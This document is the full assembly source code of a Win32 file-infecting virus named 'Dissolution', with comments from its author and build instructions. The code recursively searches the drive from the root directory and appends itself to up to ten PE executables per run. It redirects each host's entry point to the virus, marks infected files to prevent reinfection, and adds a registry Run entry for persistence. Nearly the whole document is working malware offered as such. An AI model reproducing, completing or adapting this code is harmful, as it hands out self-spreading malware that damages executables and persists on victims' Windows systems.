;
; [ Win32.Dissolution       Vorgon ]       
; [ 3584 bytes         Target - PE  Portable Executable files Win32 32 bit ]        
; [ 01/27/03        Made in Canada ]
; 
;
;
;
; [ Introduction ]
;
; This is my third virus. Compaired to my last two virii it is much more
; effective at spreading. First of all it infects 10 files at a time rather
; then just one. Secondly it adds itself to an area of the registry that
; ensures it will be run everytime on startup. And finaly a few changes
; have been made to the existing code.
; 
;
;
; [ The Infection ]
;
; Below is a break down of what the virus does:
;
; - Get the delta offset and save the starting location of the virus
; - Save registers incase the host program needs them
; - Get the location of the kernel32.dll in memory
; - Use the GetFunctionAddresses procedure to get the kernel32 api function
;   addreses.
; - Call the FindHostFile procedure to find a valid PE file to infect.
; - Call the GetHeader procedure which reads the PE header into memory
; - Call the AddCodeToHost procedure which does many things:
;              - Writes this program in memory to the end of the host file
;              - Updates the last section header to include all the data
;                up to the EOF, Updates its virtual size, and makes it
;                Readable/Writable/Executable
;              - Updates the program image size
;              - Sets the entry point to the virus code
;              - Adds a signature to location 79h to stop another infection
; - Call PutHeader procedure which writes the updated PE Header to the host 
; - Call AddToRegistry procedure which adds the last infected file to
; - the registery
; - Restore registers for the host program
; - Returns control to the host program
;
;
; [ Assembling ]
; rename file to disso
; tasm32 /ml disso
; tlink32 -x /Tpe /c disso,disso
; editbin /SECTION:CODE,rwe disso.exe
;
;
 
.386p
.model flat, stdcall
extrn           ExitProcess : PROC
extrn           MessageBoxA : PROC
 
NULL               equ 0
Generic_Read       equ 080000000h
Generic_Write      equ 040000000h
Generic_RW         equ 0C0000000h
Open_Existing      equ 3
Seek_Begin         equ 0
Seek_Current       equ 1
Seek_End           equ 2
HKEY_LOCAL_MACHINE equ 80000002h
REG_SZ             equ 1
 
.DATA     ; Data Section
        dd 0
.CODE     ; Code Section
Main:
        
;----------------------------------------------------------------------------
; Get delta offset and the start location of the virus in memory
;----------------------------------------------------------------------------
 
        push    ebp
        call    GetDeltaPointer
GetDeltaPointer:
        pop     ebp
        sub     ebp, offset GetDeltaPointer
 
        Call    SaveRegisters
 
        mov     [ebp+StartOfCode], ebp
        lea     eax, GetDeltaPointer
        add     [ebp+StartOfCode], eax
        sub     [ebp+StartOfCode], 6               ;get the start address of virus in memory
 
        mov     eax, [ebp+HEP2]                    ;Set the return to host address
        mov     [ebp+HostEntryPoint], eax
       
;----------------------------------------------------------------------------
; Virus Data
;----------------------------------------------------------------------------
 
        jmp     JumpOverData
        
        ; The below region is data variables
 
        StartOfCode            dd 0
        VirusSignature         dd 0DEADBEEFh
 
        Handle                 dd 0
        NumberOfBytesRead      dd 0
 
        PE_Header              db 248 dup(0)
        LocationOfHeader       dd 0
        
        SearchString           db '*.*',0
        FindHandle             dd 0
        NoMoreLeft             dd 0
        BackDir                db '..', 0
        RootDirectory          db 'c:\', 0
        
        RegistrySubKey         db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
        RegistryName           db 'Start-up Program', 0
        RegistryValue          db 100 dup(0)
        RegistryKeyHandle      dd 0
 
 
 ; structuree used by findfirstfile api
Win32_Find_Data:
        FileAttributes         dd 0
        CreateTime             dq 0
        LastAccessTime         dq 0
        LastWriteTime          dq 0
        FileSizeHigh           dd 0
        FileSizeLow            dd 0
        Reserved0              dd 0
        Reserved1              dd 0
        FullFileName           db 260 dup(0)
        AlternateFileName      db 14 dup(0)
 
 ; this structure is used to manipulation section header in PE file
SectionHeader:      
        ANSI_Name              db 8 dup(0)
        VirtualSize            dd 0
        VirtualAddress         dd 0
        SizeOfRawData          dd 0
        PointerToRawData       dd 0
        PointerToRelocs        dd 0
        PointerToLinNums       dd 0
        NumberOfRelocs         dw 0
        NumberOfLineNums       dw 0
        Characteristics        dd 0
 
        Kernel32Address        dd 0         
 
 
 ; list of various APIs used by the virus
 ; since a virus doesn't have a valid IAT, so it has to contruct this at runtime, soas it can calls other APIs at runtime
kernel32AddressTable:
        szCreateFileA          db 'CreateFileA',0
        _CreateFileA           dd 0
        szWriteFile            db 'WriteFile',0
        _WriteFile             dd 0
        szCloseHandle          db 'CloseHandle',0
        _CloseHandle           dd 0
        szReadFile             db 'ReadFile',0
        _ReadFile              dd 0
        szSetFilePointer       db 'SetFilePointer',0
        _SetFilePointer        dd 0
        szFindFirstFileA       db 'FindFirstFileA',0
        _FindFirstFileA        dd 0
        szFindNextFileA        db 'FindNextFileA',0
        _FindNextFileA         dd 0
        szFindClose            db 'FindClose',0
        _FindClose             dd 0
        szSetCurrentDirectoryA db 'SetCurrentDirectoryA', 0
        _SetCurrentDirectoryA  dd 0
        szGetCurrentDirectory  db 'GetCurrentDirectory', 0
        _GetCurrentDirectory   dd 0
        szLoadLibraryA         db 'LoadLibraryA', 0
        _LoadLibraryA          dd 0
        szGetProcAddress       db 'GetProcAddress', 0
        _GetProcAddress        dd 0
        szFreeLibrary          db 'FreeLibrary', 0
        _FreeLibrary           dd 0
        szGetCommandLineA      db 'GetCommandLineA', 0
        _GetCommandLineA       dd 0
        szExitProcess          db 'ExitProcess', 0
        _ExitProcess           dd 0
                               db 'ENDS'
 
 ; function imports from advapi32.dll
Advapi32AddressTable:
        szAdvapi32             db 'advapi32.dll', 0
        _advapi32              dd 0
        szRegOpenKeyA          db 'RegOpenKeyA', 0 
        _RegOpenKeyA           dd 0
        szRegSetValueExA       db 'RegSetValueExA', 0
        _RegSetValueExA        dd 0
        szRegCloseKey          db 'RegCloseKey', 0
        _RegCloseKey           dd 0
 
        loc  dd 0         ; this varibles contains address where EXE code ends
        loc2 dd 0
 
        HostEntryPoint         dd 0
        HEP2                   dd 00401000h
 
        _EBP                   dd 0
        _EDI                   dd 0
        _ESI                   dd 0
        _EAX                   dd 0
        _EBX                   dd 0
        _ECX                   dd 0
        _EDX                   dd 0
 
        NoHostReturn           dd 1
       
JumpOverData: 
        call    GetKernel32Address                    ; Get the address of the kernel 
        cmp     eax, -1
        je      BackToHost                            ; if we couldn't find kernel32, the return to host
        mov     [ebp+Kernel32Address], eax           ; store it for later use
 
;----------------------------------------------------------------------------
; Get the required API function addresses from the Kernel32.dll
;----------------------------------------------------------------------------  
        lea     esi, [ebp+kernel32AddressTable]
        call    GetFunctionAddresses               ; use the kernel32 base address to find APIs
     
;----------------------------------------------------------------------------
; Get the required API function addresses from the advapi32.dll
;----------------------------------------------------------------------------
 
        lea     edx, [ebp+szAdvapi32]
        push    edx
        call    [ebp+_LoadLibraryA]                   ; Load the library
        cmp     eax, 0
        je      BackToHost
        mov     [ebp+_advapi32], eax
 
        lea     edx, [ebp+szRegOpenKeyA]
        push    edx
        push    [ebp+_advapi32]
        call    [ebp+_GetProcAddress]
        mov     [ebp+_RegOpenKeyA], eax
 
        lea     edx, [ebp+szRegSetValueExA]
        push    edx
        push    [ebp+_advapi32]
        call    [ebp+_GetProcAddress]
        mov     [ebp+_RegSetValueExA], eax
 
        lea     edx, [ebp+szRegCloseKey]
        push    edx
        push    [ebp+_advapi32]
        call    [ebp+_GetProcAddress]
        mov     [ebp+_RegCloseKey], eax
                    
;----------------------------------------------------------------------------
; Check the command line for parameter -NHR
;----------------------------------------------------------------------------
  
        ;If the paramter -NHR is found then dont return to host after
        ;infection, just exit.
 
Parameter1:
        call    [ebp+_GetCommandLineA]
        mov     ecx, 100
FindParameterNHR:
        cmp     [eax], 'RHN-'
        je      FoundParameterNHR
        inc     eax
        loop    FindParameterNHR
        jmp     BeginInfection
 
FoundParameterNHR:
        mov     [ebp+NoHostReturn], 1
 
;----------------------------------------------------------------------------
; The infection process begins here
;----------------------------------------------------------------------------
 
BeginInfection:
 
        mov     ecx, 10                                     ; number of files to infect  currently 10 at a time
infectFive: 
        push    ecx
        call    FindHostFile                                ; Find and open an exe to infect
        pop     ecx
        cmp     eax, -1
        je      BackToHost																	; no exe found, return ASAP
 
        push    ecx
        call    GetHeader                                   ; Get its PE header
 
        call    AddCodeToHost                               ; Add virus to it
 
        call    PutHeader                                   ; Write the updated PE header
                                                            ; to it
        mov     eax, [ebp+Handle]                   
        call    CloseFile                                   ; Close it
 
        pop     ecx
        loop    infectFive
 
        call    AddToRegistry                               ; add the last infected file to 
                                                            ; the registry
BackToHost:
        push    [ebp+_advapi32]
        call    [ebp+_FreeLibrary]                          ; free advapi32 library
 
        cmp     dword ptr [ebp+NoHostReturn], 1
        je	Exit
       
        mov     eax, dword ptr [ebp+HostEntryPoint]
        push    eax
        call    RestoreRegisters
        ret                                                 ; return to host
 
Exit:
        push	0
        call    [ebp+_ExitProcess]
 
        db      'Vorgon, Canada, 2003'                      ; Signature
 
;----------------------------------------------------------------------------
; General Procedures used by main virus to do some of it's task such as use registry
;----------------------------------------------------------------------------
 
AddToRegistry   PROC
        lea     edx, [ebp+RegistryValue]
        push    edx
        push    100
        call    [ebp+_GetCurrentDirectory]                  ; Get the path name
 
        lea     edx, [ebp+RegistryValue]
        add     edx, eax
        mov     byte ptr [edx], '\'                         ; Add a '\' to the end
 
        lea     eax, [ebp+FullFileName-1]                   ; copy the last infected file
CopyName:                                                   ; name to the end of string
        inc     edx                       
        inc     eax
        mov     bl, [eax]
        mov     [edx], bl
        cmp     byte ptr [eax], 0
        jne     CopyName
 
        mov     [edx], 'RHN-'                               ; Add the -FG paramter to the end
 
        ; open a key
        lea     edx, [ebp+RegistryKeyHandle]
        push    edx
        lea     edx, [ebp+RegistrySubKey]
        push    edx
        push    HKEY_LOCAL_MACHINE
        call    [ebp+_RegOpenKeyA]
        cmp     eax, 0
        jne     FailedToAdd
 
        ; add new value
        push    100
        lea     edx, [ebp+RegistryValue]
        push    edx
        push    REG_SZ
        push    0
        lea     edx, [ebp+RegistryName]
        push    edx
        push    [ebp+RegistryKeyHandle]
        call    [ebp+_RegSetValueExA]
 
        ;close key
        push    [ebp+RegistryKeyHandle]
        call    [ebp+_RegCloseKey]
 
FailedToAdd:
        ret
AddToRegistry   ENDP
;;;---------------------------------------------------------
 
 ;---------------------------------------
 ; This function saves all registers so as we can resume execution, once the virus has executed
 ;--------------------------------------------
SaveRegisters PROC
        mov	[ebp+_EDI], edi
        mov	[ebp+_ESI], esi
        mov	[ebp+_EBX], ebx
        mov	[ebp+_ECX], ecx
        mov	[ebp+_EDX], edx
        pop	eax
        pop	ebx
        mov	[ebp+_EBP], ebx
        push	eax
        ret
SaveRegisters ENDP
 
 
  ;---------------------------------------
 ; This function restore all registers to resume execution, once the virus has executed
 ; make sure that saved registers are valid, otherwise you are bound to crash.
 ;--------------------------------------------
RestoreRegisters PROC
        mov	edi, [ebp+_EDI]
        mov	esi, [ebp+_ESI]
        mov	ebx, [ebp+_EBX]
        mov	ecx, [ebp+_ECX]
        mov	edx, [ebp+_EDX]
        mov	ebp, [ebp+_EBP] 
        ret
RestoreRegisters ENDP
 
 
 
   ;---------------------------------------
 ; This function  appends the virus code to the EXE file, then marks the last section as execute/read/write permissions
 ; the virus also save Original Entry Point
 ; The virus then changes the Entry Point to its own code, so as EXE is exexcuted, virus gets the chance to execute first and then the program
 ;--------------------------------------------
AddCodeToHost PROC
        push    dword ptr [ebp+NoHostReturn]
        mov     dword ptr [ebp+NoHostReturn], 0
 
        mov     eax, dword ptr [ebp+PE_Header+40]
        add     eax, dword ptr [ebp+PE_Header+52]           ; add image base
        mov     [ebp+HEP2], eax                             ; Save original entry point
 
        mov     eax, 0
        mov     ebx, 2
        Call    SeekData                                    ; Seek to EOF
        mov     [ebp+loc], eax
        add     [ebp+loc], 3584                             ; loc = new EOF
 
        mov     eax, [ebp+StartOfCode]
        mov     ebx, 3584
        call    PutData                                     ; Write virus to EOF
 
        xor     edx, edx
        xor     eax, eax
        mov     ax, word ptr [ebp+PE_Header+6] 
        dec     eax
        mov     ebx, 40
        mul     ebx
        add     eax, [ebp+LocationOfHeader]
        add     eax, 248            
        mov     ebx, 0
        call    SeekData                                   ; Seek to the last section header
 
        lea     eax, [ebp+SectionHeader]
        mov     ebx, 40
        call    GetData                                    ; Get the last section header
 
        mov     eax, dword ptr [ebp+PE_Header+80]
        sub     eax, [ebp+VirtualSize]
        mov     dword ptr [ebp+PE_Header+80], eax          ; subtract the section size from the image size
 
        mov     eax, [ebp+loc]
        sub     eax, [ebp+PointerToRawData]   
        mov     [ebp+SizeOfRawData], eax                   ; Update SizeOfRawData
 
        shr     eax, 12                                    ; divide eax by 4096
        shl     eax, 12                                    ; multiply eax by 4096
        add     eax, 8192                                  ; add 1 - 2k for any unitialized data
        mov     [ebp+VirtualSize], eax                     ; Update VirtualSize
        
        mov     eax, [ebp+SizeOfRawData]
        sub     eax, 3584
        add     eax, [ebp+VirtualAddress]
        mov     dword ptr [ebp+PE_Header+40], eax          ; Set Entry point
 
        mov     [ebp+Characteristics], 0E0000020h          ; Make Section Executable/Readable/Writable
 
        mov     eax, -40
        mov     ebx, 1
        call    SeekData
        lea     eax, [ebp+SectionHeader]
        mov     ebx, 40
        Call    PutData                                    ; Write section header back to file
 
        mov     eax, dword ptr [ebp+PE_Header+80]
        add     eax, [ebp+VirtualSize]
        mov     dword ptr [ebp+PE_Header+80], eax          ; update image size
 
        mov     eax, 79h
        mov     ebx, 0
        call    SeekData
        lea     eax, [ebp+VirusSignature]
        mov     ebx, 4
        Call    PutData                                    ; Write Virus Signature to host
                                                           ; to prevent reinfection
        pop     dword ptr [ebp+NoHostReturn]
        ret
AddCodeToHost ENDP
 
FindHostFile    PROC
        mov     [ebp+NoMoreLeft], 1
        mov     edi, 0
 
        lea     edx, [ebp+RootDirectory]
        push    edx
        call    [ebp+_SetCurrentDirectoryA]                ; Start searching at the root directory
        
findFirst:
        lea     edx, [ebp+Win32_Find_Data]
        push    edx
        lea     edx, [ebp+SearchString]
        push    edx
        call    [ebp+_FindFirstFileA]
        mov     [ebp+FindHandle], eax                      ; Find the first file
 
checkList:      
        cmp     [ebp+NoMoreLeft], 0
        je      backDir
        cmp     byte ptr [ebp+FullFileName], '.'
        je      findNext                                   ; Skip directories . and ..      
        cmp     [ebp+FileAttributes], 10h
        je      directoryFound
 
        lea     esi, [ebp+FullFileName]
        mov     ecx, 254
isEXE:
        cmp     [esi], 'exe.'
        je      foundEXE
        inc     esi
        loop    isEXE
        jmp     findNext
 
foundEXE:
        ; open the exe file
        push    0
        push    0
        push    Open_Existing
        push    0
        push    0
        push    Generic_RW
        lea     edx, [ebp+FullFileName]
        push    edx
        call    [ebp+_CreateFileA]
        cmp     eax, -1
        je      notEXE
        mov     [ebp+Handle], eax
 
        ; Seek to location 3Ch
        push    Seek_Begin                                 
        push    0
        push    3Ch
        push    [ebp+Handle]
        call    [ebp+_SetFilePointer]
        cmp     eax, -1
        je      notEXE
 
        ; Read 4 bytes
        push    0
        lea     edx, [ebp+NumberOfBytesRead]
        push    edx
        push    4
        lea     edx, [ebp+loc]
        push    edx
        push    [ebp+Handle]                           
        call    [ebp+_ReadFile]
        cmp     eax, 0
        je      notEXE
 
        ; Seek to location in loc 
        push    Seek_Begin                                 
        push    0
        push    [ebp+loc]                                 
        push    [ebp+Handle]
        call    [ebp+_SetFilePointer]
        cmp     eax, -1
        je      notEXE
 
        ; Read the signature
        push    0
        lea     edx, [ebp+NumberOfBytesRead]
        push    edx
        push    4
        lea     edx, [ebp+loc]
        push    edx
        push    [ebp+Handle]                           
        call    [ebp+_ReadFile]
        cmp     eax, 0
        je      notEXE
 
        cmp     [ebp+loc], 00004550h
        jne     notEXE
 
        push    Seek_Begin                                 
        push    0
        push    79h                             
        push    [ebp+Handle]
        call    [ebp+_SetFilePointer]
        cmp     eax, -1
        je      notEXE
 
        ; Read 4 bytes
        push    0
        lea     edx, [ebp+NumberOfBytesRead]
        push    edx
        push    4
        lea     edx, [ebp+loc]
        push    edx
        push    [ebp+Handle]                           
        call    [ebp+_ReadFile]
        cmp     eax, 0
        je      notEXE
 
        cmp     [ebp+loc], 0DEADBEEFh
        je      notEXE
       
        cmp     edi, 0                         ; nothing to unwind?
        je      fileFound     
unWind:
        pop     eax                            ; pop the return call
        pop     eax                            ; pop the find handle
        push    eax
        call    [ebp+_FindClose]               ; close the find handle
        dec     edi 
        cmp     edi, 0
        jne     unWind
 
        mov     eax, 0
        ret                                    ; return with success code 0
 
notEXE:
        push    [ebp+Handle]
        call    [ebp+_CloseHandle]
        jmp     findNext
 
fileFound:
        push    [ebp+FindHandle]
        call    [ebp+_FindClose]
        ret
 
findNext:
        lea     edx, [ebp+Win32_Find_Data]
        push    edx
        push    [ebp+FindHandle]
        call    [ebp+_FindNextFileA]
        mov     [ebp+NoMoreLeft], eax
        jmp     checkList
 
directoryFound:
        inc     edi
        push    [ebp+FindHandle]
 
        lea     edx, [ebp+FullFileName]
        push    edx
        call    [ebp+_SetCurrentDirectoryA]       ; set to current directory
        call    findFirst
 
        pop     [ebp+FindHandle]
 
        jmp     findNext
 
backDir:
        dec     edi
        push    [ebp+FindHandle]
        call    [ebp+_FindClose]
 
        lea     edx, [ebp+BackDir]
        push    edx
        call    [ebp+_SetCurrentDirectoryA]       ; Go back a directory
 
        mov     eax, -1                           ; if this is the last return then set failure code -1
        ret
FindHostFile    ENDP
 
GetHeader PROC
        mov     eax, 3Ch
        mov     ebx, 0
        call    SeekData
        lea     eax, [ebp+LocationOfHeader]
        mov     ebx, 4
        call    GetData
        mov     eax, [ebp+LocationOfHeader]
        mov     ebx, 0
        call    SeekData
        lea     eax, [ebp+PE_Header]
        mov     ebx, 248
        call    GetData
        ret
GetHeader ENDP
 
PutHeader PROC
        mov     eax, 3Ch
        mov     ebx, 0
        call    SeekData
        lea     eax, [ebp+LocationOfHeader]
        mov     ebx, 4
        call    GetData
        mov     eax, [ebp+LocationOfHeader]
        mov     ebx, 0
        call    SeekData
        lea     eax, [ebp+PE_Header]
        mov     ebx, 248
        call    PutData
        ret
PutHeader ENDP
 
GetFunctionAddresses PROC
        
findAddresses: 
        mov     eax, [ebp+Kernel32Address]          ;EAX = Kernel32 Address
        mov     ebx, [eax+3Ch]
        add     ebx, eax
        add     ebx, 120
        mov     ebx, [ebx]
        add     ebx, eax                            ;EBX = Export Address
 
        xor     edx, edx
        mov     ecx, [ebx+32]
        add     ecx, eax
        push    esi
        push    edx
CompareNext:
        pop     edx
        pop     esi
        inc     edx
        mov     edi, [ecx]
        add     edi, eax
        add     ecx, 4
        push    esi
        push    edx
CompareName:
        mov     dl, [edi]
        mov     dh, [esi]
        cmp     dl, dh
        jne     CompareNext
        inc     edi
        inc     esi
        cmp     byte ptr [esi], 0
        je      GetAddress
        jmp     CompareName
GetAddress:
        pop     edx
        pop     edi  ;pop     esi
        dec     edx
        shl     edx, 1        
        mov     ecx, [ebx+36]
        add     ecx, eax
        add     ecx, edx
        xor     edx, edx
        mov     dx, [ecx]
        shl     edx, 2
        mov     ecx, [ebx+28]
        add     ecx, eax
        add     ecx, edx
        add     eax, [ecx]
 
        inc     esi
        mov     [esi], eax
        add     esi, 4
        cmp     [esi], 'SDNE'
        jne     findAddresses
        ret
GetFunctionAddresses ENDP
 
GetKernel32Address PROC
 
        mov      ecx, 00000000h
FindMZ:
        add      ecx, 1000h
        cmp      ecx, 00600000h
        je       KernelNotFound
 
        pushad
 
        lea     esi, [ebp+Handler]
        push    esi
        push    dword ptr fs:[0]
        mov     dword ptr fs:[0], esp
        
        cmp     word ptr [ecx], 'ZM'
        je      FindPE
 
        pop     dword ptr fs:[0]
        add     esp, 32 + 4
 
        jmp FindMZ
 
Handler:
        mov     esp, [esp+8]
        pop     dword ptr fs:[0]
        add     esp, 4
        popad
        jmp     FindMZ
 
FindPE:
        pop     dword ptr fs:[0]
        add     esp, 32 + 4
 
        mov     eax, [ecx+3Ch]       
        add     eax, ecx 
        cmp     dword ptr [eax], 00004550h           ;PE?
        jne     FindMZ
 
FindImportSection:
        mov    ebx, [eax+128]
        cmp    ebx, 0         
        je     FindMZ
        add    ebx, ecx                              ;EBX = Location of Import Section
 
FindKernelImport:
        mov    eax, [ebx+12]
        add    eax, ecx     ;
        cmp    [eax], 'NREK'
        je     FindKernelAddress
        add    ebx, 20
        cmp    dword ptr [ebx], 0
        je     FindMZ
        jmp    FindKernelImport
 
FindKernelAddress:
        mov    eax, [ebx+16]
        add    eax, ecx           
        mov    eax, [eax]
        xor    ax, ax
l1:     cmp    word ptr [eax], 'ZM'
        je     done
        sub    eax, 1000h
        jmp    l1
done:
        ret
 
KernelNotFound:
        mov eax, -1
        ret
             
GetKernel32Address ENDP
 
;----------------------------------------------------------------------------
; File I/O Procedures
;----------------------------------------------------------------------------
 
OpenFile PROC
        push    00000000h
        push    00000080h
        push    00000003h
        push    00000000h
        push    00000000h
        push    ebx                                 ; open for read/write
        push    eax 
        call    [ebp+_CreateFileA]
        mov     [ebp+Handle], eax
        ret
OpenFile ENDP
 
CloseFile PROC
        push    eax
        call    [ebp+_CloseHandle]
        ret
CloseFile ENDP
 
SeekData PROC
        push    ebx                                 ; 0 = begin / 1 = current / 2 = end
        push    0
        push    eax                                 ; location to seek to
        push    [ebp+Handle]
        call    [ebp+_SetFilePointer]
        ret
SeekData ENDP
 
GetData PROC
        lea     ecx, [ebp+NumberOfBytesRead]
        push    00000000h
        push    ecx
        push    ebx
        push    eax
        push    [ebp+Handle]                           
        call    [ebp+_ReadFile]
        ret
GetData ENDP
 
PutData PROC
        lea     ecx, [ebp+NumberOfBytesRead]
        push    0
        push    ecx
        push    ebx
        push    eax
        push    [ebp+Handle]
        call    [ebp+_WriteFile]
        ret
PutData ENDP
 
        End   Main
